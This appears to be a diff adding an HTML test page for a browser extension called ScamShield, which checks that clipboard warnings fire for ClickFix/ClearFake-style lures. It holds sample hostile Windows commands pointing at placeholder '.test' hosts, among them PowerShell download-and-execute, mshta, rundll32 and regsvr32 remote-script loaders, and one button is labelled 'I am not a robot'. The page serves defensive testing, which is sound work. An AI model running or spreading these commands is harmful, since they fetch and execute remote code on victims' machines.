@@ -1,0 +1,310 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>ScamShield — ClickFix / ClearFake Test Page</title>
+    <style>
+      *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+      :root {
+        --bg:         #f9fafb;
+        --surface:    #ffffff;
+        --border:     #d1d5db;
+        --text:       #111827;
+        --muted:      #6b7280;
+        --code-bg:    #f3f4f6;
+        --badge-none-bg:   #dcfce7; --badge-none-fg:   #166534;
+        --badge-med-bg:    #fef9c3; --badge-med-fg:    #854d0e;
+        --badge-high-bg:   #fee2e2; --badge-high-fg:   #991b1b;
+        --btn-border:      #374151;
+      }
+
+      body {
+        font-family: "Segoe UI", system-ui, sans-serif;
+        font-size: 14px;
+        line-height: 1.5;
+        color: var(--text);
+        background: var(--bg);
+        padding: 32px 16px 64px;
+        max-width: 960px;
+        margin: 0 auto;
+      }
+
+      header { margin-bottom: 28px; }
+      header h1 { font-size: 22px; margin-bottom: 6px; }
+      header p  { color: var(--muted); max-width: 640px; }
+
+      /* ── Toast ───────────────────────────────────────────────────────────── */
+      #toast {
+        position: fixed;
+        bottom: 24px;
+        left: 50%;
+        transform: translateX(-50%) translateY(80px);
+        background: #1f2937;
+        color: #f9fafb;
+        padding: 10px 20px;
+        border-radius: 8px;
+        font-size: 13px;
+        white-space: nowrap;
+        box-shadow: 0 4px 16px rgba(0,0,0,0.3);
+        transition: transform 0.2s ease, opacity 0.2s ease;
+        opacity: 0;
+        pointer-events: none;
+        z-index: 9999;
+      }
+      #toast.show {
+        transform: translateX(-50%) translateY(0);
+        opacity: 1;
+      }
+
+      /* ── Scenario grid ───────────────────────────────────────────────────── */
+      .section { margin-bottom: 32px; }
+      .section-title {
+        font-size: 12px;
+        font-weight: 700;
+        letter-spacing: 0.07em;
+        text-transform: uppercase;
+        color: var(--muted);
+        margin-bottom: 12px;
+        padding-bottom: 6px;
+        border-bottom: 1px solid var(--border);
+      }
+
+      .grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+        gap: 12px;
+      }
+
+      .card {
+        background: var(--surface);
+        border: 1px solid var(--border);
+        border-radius: 10px;
+        padding: 14px;
+        display: flex;
+        flex-direction: column;
+        gap: 10px;
+      }
+
+      .card-header {
+        display: flex;
+        align-items: flex-start;
+        justify-content: space-between;
+        gap: 8px;
+      }
+
+      .card-title { font-weight: 600; font-size: 13px; }
+
+      .badge {
+        font-size: 10px;
+        font-weight: 700;
+        letter-spacing: 0.04em;
+        text-transform: uppercase;
+        padding: 2px 7px;
+        border-radius: 20px;
+        white-space: nowrap;
+        flex-shrink: 0;
+      }
+      .badge-none   { background: var(--badge-none-bg); color: var(--badge-none-fg); }
+      .badge-medium { background: var(--badge-med-bg);  color: var(--badge-med-fg); }
+      .badge-high   { background: var(--badge-high-bg); color: var(--badge-high-fg); }
+
+      code {
+        display: block;
+        background: var(--code-bg);
+        border-radius: 6px;
+        padding: 8px 10px;
+        font-family: "Consolas", "Courier New", monospace;
+        font-size: 11px;
+        white-space: pre-wrap;
+        word-break: break-all;
+        color: #374151;
+        max-height: 80px;
+        overflow: hidden;
+      }
+
+      button.copy-btn {
+        align-self: flex-start;
+        font-size: 13px;
+        font-weight: 600;
+        padding: 7px 14px;
+        border-radius: 7px;
+        border: 1px solid var(--btn-border);
+        background: var(--btn-border);
+        color: #fff;
+        cursor: pointer;
+        transition: background 0.15s;
+      }
+      button.copy-btn:hover  { background: #111827; }
+      button.copy-btn:active { transform: scale(0.97); }
+
+      .card:has(.badge-none) button.copy-btn {
+        background: #16a34a;
+        border-color: #16a34a;
+      }
+      .card:has(.badge-none) button.copy-btn:hover {
+        background: #15803d;
+        border-color: #15803d;
+      }
+
+      footer {
+        margin-top: 40px;
+        font-size: 12px;
+        color: var(--muted);
+        border-top: 1px solid var(--border);
+        padding-top: 14px;
+      }
+      footer code { display: inline; background: var(--code-bg); padding: 1px 5px; }
+    </style>
+  </head>
+  <body>
+
+    <header>
+      <h1>ScamShield — ClickFix / ClearFake Test Page</h1>
+      <p>
+        Click any <strong>Copy</strong> button to push the payload into the system clipboard.
+        The extension should show a warning overlay for every <em>detected</em> scenario and
+        stay silent for the <em>benign control</em>.
+      </p>
+    </header>
+
+    <!-- ── Benign control ──────────────────────────────────────────────────── -->
+    <section class="section">
+      <div class="section-title">Control — no detection expected</div>
+      <div class="grid">
+        <div class="card">
+          <div class="card-header">
+            <span class="card-title">Benign text</span>
+            <span class="badge badge-none">Benign</span>
+          </div>
+          <code id="p-benign">Meeting notes: bring laptop and charger at 09:30.</code>
+          <button class="copy-btn" data-payload="p-benign">Copy benign text</button>
+        </div>
+      </div>
+    </section>
+
+    <!-- ── High confidence ─────────────────────────────────────────────────── -->
+    <section class="section">
+      <div class="section-title">High confidence — detection expected</div>
+      <div class="grid">
+
+        <div class="card">
+          <div class="card-header">
+            <span class="card-title">PowerShell download-execute</span>
+            <span class="badge badge-high">High</span>
+          </div>
+          <code id="p-powershell">powershell -w hidden -nop -c "IEX ((New-Object Net.WebClient).DownloadString('https://cdn-verification-check.test/update.ps1'))"</code>
+          <button class="copy-btn" data-payload="p-powershell">I am not a robot</button>
+        </div>
+
+        <div class="card">
+          <div class="card-header">
+            <span class="card-title">Base64 encoded command (-enc)</span>
+            <span class="badge badge-high">High</span>
+          </div>
+          <code id="p-encoded">powershell.exe -enc QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo0NTY3ODkwQUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo=</code>
+          <button class="copy-btn" data-payload="p-encoded">Copy encoded payload</button>
+        </div>
+
+        <div class="card">
+          <div class="card-header">
+            <span class="card-title">mshta remote payload</span>
+            <span class="badge badge-high">High</span>
+          </div>
+          <code id="p-mshta">mshta https://verify-human-check.test/payload.hta</code>
+          <button class="copy-btn" data-payload="p-mshta">Copy mshta payload</button>
+        </div>
+
+        <div class="card">
+          <div class="card-header">
+            <span class="card-title">rundll32 JavaScript remote</span>
+            <span class="badge badge-high">High</span>
+          </div>
+          <code id="p-rundll-js">rundll32 javascript:"\..\mshtml,RunHTMLApplication";document.write();GetObject("script:https://verify-human-check.test/a.sct")</code>
+          <button class="copy-btn" data-payload="p-rundll-js">Copy rundll32 payload</button>
+        </div>
+
+        <div class="card">
+          <div class="card-header">
+            <span class="card-title">rundll32 UNC/URI</span>
+            <span class="badge badge-high">High</span>
+          </div>
+          <code id="p-rundll-unc">rundll32 \\verify-human-check.test@ssl\6f832e21-4e80-484f-9119-aef9fc6c5b28\google.ct,#1 wpTi52N1</code>
+          <button class="copy-btn" data-payload="p-rundll-unc">Copy rundll32 UNC payload</button>
+        </div>
+
+        <div class="card">
+          <div class="card-header">
+            <span class="card-title">regsvr32 scriptlet</span>
+            <span class="badge badge-high">High</span>
+          </div>
+          <code id="p-regsvr">regsvr32 /s /u /i:https://verify-human-check.test/file.sct scrobj.dll</code>
+          <button class="copy-btn" data-payload="p-regsvr">Copy regsvr32 payload</button>
+        </div>
+
+      </div>
+    </section>
+
+    <!-- ── Medium confidence ───────────────────────────────────────────────── -->
+    <section class="section">
+      <div class="section-title">Medium confidence — detection expected</div>
+      <div class="grid">
+
+        <div class="card">
+          <div class="card-header">
+            <span class="card-title">cmd /c execution</span>
+            <span class="badge badge-medium">Medium</span>
+          </div>
+          <code id="p-cmd">cmd /c start "" powershell -nop -w hidden -c "echo test-run"</code>
+          <button class="copy-btn" data-payload="p-cmd">Copy cmd payload</button>
+        </div>
+
+        <div class="card">
+          <div class="card-header">
+            <span class="card-title">Windows Script Host (wscript)</span>
+            <span class="badge badge-medium">Medium</span>
+          </div>
+          <code id="p-wsh">wscript //e:jscript //B C:\Users\Public\stage.js</code>
+          <button class="copy-btn" data-payload="p-wsh">Copy wscript payload</button>
+        </div>
+
+      </div>
+    </section>
+
+    <footer>
+      <p>
+        Tip: if the browser blocks clipboard writes on <code>file://</code> URLs,
+        serve this file over localhost (e.g. <code>npx serve .</code>).
+      </p>
+    </footer>
+
+    <!-- ── Toast notification ──────────────────────────────────────────────── -->
+    <div id="toast"></div>
+
+    <script>
+      const toast = document.getElementById('toast');
+      let toastTimer = null;
+
+      function showToast(msg) {
+        toast.textContent = msg;
+        toast.classList.add('show');
+        clearTimeout(toastTimer);
+        toastTimer = setTimeout(() => toast.classList.remove('show'), 2200);
+      }
+
+      document.querySelectorAll('.copy-btn').forEach((btn) => {
+        btn.addEventListener('click', async () => {
+          const id = btn.getAttribute('data-payload');
+          const payload = document.getElementById(id).textContent;
+          try {
+            await navigator.clipboard.writeText(payload);
+            showToast('Copied — watch for extension overlay');
+          } catch (err) {
+            showToast('Clipboard write failed: ' + err.message);
+          }
+        });
+      });
+    </script>
+  </body>
+</html>
